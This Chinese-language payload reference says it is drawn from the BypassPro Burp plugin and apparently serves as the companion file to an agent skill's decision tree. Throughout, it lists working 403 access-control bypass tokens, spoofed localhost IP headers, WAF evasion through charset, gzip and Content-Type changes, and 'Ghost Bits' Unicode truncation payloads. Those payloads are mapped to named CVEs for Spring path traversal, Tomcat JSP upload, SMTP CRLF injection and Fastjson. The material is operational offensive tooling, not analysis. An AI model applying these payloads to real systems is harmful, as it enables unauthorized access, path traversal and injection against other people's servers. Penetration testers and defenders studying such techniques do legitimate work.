# Bypass Payload 参考

> 来源：BypassPro（0x727 / p0desta）Burp 插件配置，已验证的实战 payload 分类。
> 本文件是 SKILL.md 决策树的配套参考——先按 SKILL.md 识别控制类型和路径，再查本文件取具体 payload。

---

## 1. 访问控制绕过 / 403 Bypass

### 1.1 Suffix（路径后缀注入）

在受限路径末尾追加 token，利用路径规范化差异绕过访问控制：

| 分组 | Payload | 原理 |
|------|---------|------|
| 静态资源伪装 | `.js` `.css` `.json` `.html` `;.css` `;.js` | 伪装为静态资源，绕过 Auth Filter 规则误判 |
| 分隔符混淆 | `/.` `/` `/./` `%20` `%09` `?` `?error` `#` `/*` `%26` | 利用不同组件的路径解析差异 |
| 伪目录回退 | `/images/..;` `/public/..;` `;/` | 欺骗上游/后端的路径规范化 |
| 矩阵参数 | `;param=1` `;jsessionid=1` `;user=1` `;f=1` | Tomcat/Spring 矩阵参数解析差异 |

### 1.2 Prefix（路径前缀注入）

在受限路径前插入 token：

| 分组 | Payload | 原理 |
|------|---------|------|
| 目录层级混淆 | `/`（双斜杠） `;/` `./` `.;/` | Tomcat 矩阵参数 / 当前目录解析 |
| 编码绕过 | `%2e/` `%252e/`（双重编码） `%20/` `%09/` `..%5c/`（IIS 反斜杠） | 编码后组件解析差异 |
| 伪目录组合 | `images;/../` `images/..;/` `public/..;/` | 假静态目录 + 回退 |

### 1.3 Boundary Insert（路径段边界插入）

在路径段之间插入 token（`a/b/c` → `a;/b/c`、`a/b;/c`）：

| 分组 | Payload | 原理 |
|------|---------|------|
| 矩阵参数 | `;` `;param=1` `;jsessionid=1` | Spring/Tomcat segment 内追加 |
| 点分号回退 | `.;` `..;` | 老框架/容器解析差异 |
| 编码 | `%00`（空字节） `%2e` | 编码 token 截断 |

### 1.4 Headers（请求头伪造）

| 分组 | Headers |
|------|---------|
| 组合 IP 头 | `X-Custom-IP-Authorization: 127.0.0.1` + `X-Forwarded-For: 127.0.0.1` + `X-Client-IP: 127.0.0.1` + `X-Remote-Addr: 127.0.0.1` + `X-Originating-IP: 127.0.0.1` + `Referer: http://127.0.0.1` |
| 单头变体 | `X-Forwarded-For: 127.0.0.1:80` / `X-Forwarded-For: http://127.0.0.1` / `X-Host: 127.0.0.1` / `HTTP-Version: HTTP/1.0` |

---

## 2. WAF 绕过 — Body 编码变换

仅对有 Body 的请求（POST/PUT/PATCH）生效：

### 2.1 Body Charset（字符集转换）

WAF 无法解析但服务器能解析的字符集：

| 字符集 | 说明 |
|--------|------|
| UTF-16 | 双字节 Unicode |
| UTF-16BE | 大端序 |
| UTF-16LE | 小端序 |
| UTF-32 | 四字节 Unicode |
| UTF-32BE | 大端序 |
| UTF-32LE | 小端序 |
| IBM037 | EBCDIC 编码（大型机字符集，WAF 几乎不支持） |

### 2.2 Body Transform

| 变换 | 说明 |
|------|------|
| Gzip | Gzip 压缩请求体，WAF 无法解压检查 |

### 2.3 Content-Type 欺骗

| 伪装 | 说明 |
|------|------|
| `application/x-www-form-urlencoded` | 伪装为表单 |
| `multipart/form-data` | 伪装为文件上传 |
| `text/plain` | 伪装为纯文本，绕过 JSON/XML 解析规则 |

---

## 3. Ghost Bits — Java char→byte 截断绕过

### 3.1 原理

Java 中 `char` 是 16 位 Unicode，但某些代码路径会执行 `(byte) ch` 或 `ch & 0xFF` 截断为低 8 位。攻击者用低 8 位相同的 Unicode 字符替换 ASCII payload，WAF 看到 Unicode 字符不拦截，后端截断后看到原始 ASCII。

```
攻击者设计后端最终看到的 ASCII
→ 为每个字符挑选低 8 位相同的 Unicode 字符
→ WAF 看到 Unicode，不拦截
→ 后端 char→byte 截断，看到原始 ASCII
```

**关键认知**：Ghost Bits 不是固定 payload，不是"中文等于漏洞"。任何满足 `unicodeChar & 0xFF == targetAscii` 的字符都可以。`阮严灵丰丰甲来` 只是 CVE-2025-41242 的一组示例。

### 3.2 Ghost Atoms（单字节映射表）

| ASCII | Unicode 候选 | 低 8 位 |
|-------|-------------|---------|
| `.` | 阮 (U+962E) | 0x2E |
| `%` | 严 (U+4E25) | 0x25 |
| `u` | 灵 (U+7075) | 0x75 |
| `0` | 丰 (U+4E30) | 0x30 |
| `2` | 甲 (U+7532) | 0x32 |
| `e` | 来 (U+6765) | 0x65 |
| `j` | 陪 (U+966A) | 0x6A |
| `\r` | 瘍 (U+764D) | 0x0D |
| `\n` | 瘊 (U+760A) | 0x0A |
| `1` | 失 (U+5931) | 0x31 |
| `3` | 耳 (U+8033) | 0x33 |
| `6` | 茶 (U+8336) | 0x36 |
| `7` | 男 (U+7537) | 0x37 |
| `9` | 夹 (U+5939) | 0x39 |

空数组 `[]` 的字符（`@` `/` `:` `;` `'` `"` `<` `>` `4` `5` `8` `$`）由引擎在 `0x00..0xFF` 范围自动枚举。

### 3.3 Ghost Sequences（命名序列）

| 序列名 | Unicode 字符串 | 低 8 位还原 |
|--------|---------------|-------------|
| `dot_u002e` | 阮严灵丰丰甲来 | `.%u002e` |
| `crlf` | 瘍瘊 | `\r\n` |
| `jsp_ext` | 陪sp | `jsp` |
| `fastjson_at` | `\u٠٠٤٠` | `\u0040` → `@`（Arabic-Indic 数字，Character.digit() 兼容） |

### 3.4 Ghost Templates（CVE 漏洞链）

| 模板 | CVE | 中间件 | Target | 攻击链 |
|------|-----|--------|--------|--------|
| `spring_static_lfi` | CVE-2025-41242 | Spring | path | `阮严灵丰丰甲来` → `.%u002e` → `..` → 路径穿越 |
| `jetty_loose_hex` | CVE-2023-32315 | Jetty | path | `%2>` → `%2E` → `.`（TypeUtil.convertHexDigit 容错） |
| `tomcat_jsp_upload` | — | Tomcat | filename | `陪sp` → `jsp`（RFC2231 multipart filename* 解析） |
| `tomcat_url_hex_ghost` | — | Tomcat | filename | `%HH` 中 H 用 7-bit Ghost 字符 |
| `angus_smtp_crlf` | CVE-2025-7962 | Angus Mail | selection | CRLF 注入（`(byte) chars[i]` 截断） |
| `fastjson_x_escape` | — | Fastjson | selection | `\x4_` → `0x40` → `@`（\x 解析表未填充位置按 0 计算） |
| `fastjson_unicode_digit` | — | Fastjson | selection | `\u٠٠٤٠` → `\u0040` → `@`（Character.digit() 接受 Unicode 数字） |
| `jackson_char_to_hex` | — | Jackson | selection | `\u` hex 位 Ghost 化，charToHex(ch & 255) 截断 |
| `fullwidth_traversal` | — | Generic | path | 全角 `%２ｅ` → `%2e` → `.`（多重规范化还原） |
| `jdk_urldecoder_unicode_digit` | — | JDK | path | Arabic-Indic `٢` → `2`（Integer.parseInt 接受 Unicode 数字） |
| `bcel_ghost_bits` | — | BCEL | selection | `$$BCEL$$` 前缀 + 后续 gzip/class bytes Ghost 化 |

### 3.5 Ghost Bits 注意事项

| 规则 | 说明 |
|------|------|
| 8-bit 截断类可换组 | Spring 穿越、Tomcat %HH、CRLF 等——Ghost 字符可任意替换，只要低 8 位不变 |
| Unicode 数字类**禁止换组** | JDK URLDecoder、Fastjson Unicode Digit——依赖字符的真实数字属性，换组会破坏数学含义导致失效 |
| 7-bit vs 8-bit | Tomcat RFC2231 用 `ch & 0x7F`（7-bit），其他多为 `ch & 0xFF`（8-bit） |
| Raw Socket | 某些 Ghost payload 需要原始 TCP 发送（绕过 HTTP 库的规范化），标记 `sender: raw` |

---

## 4. 手动 WAF 工作台能力分类

| 分类 | 能力 |
|------|------|
| **Obfuscation & Noise** | 控制字符、噪音字符、路径混淆、后缀/分段/边界变形 |
| **Data Encoding** | URL 编码、Path 编码、双重 URL、混合编码、Unicode 转义、Base64、字符集编码 |
| **Char Mutation** | 全角、同形字、零宽字符、大小写变形 |
| **Header Spoof** | X-Forwarded-For、X-Client-IP、X-Remote-Addr、Referer、HTTP/1.0 |
| **Body Transform** | form/multipart/JSON 转换、Gzip、HTTP/1.0 |
| **Ghost Bits** | char→byte 截断、宽松 parser、模板化漏洞链构造 |
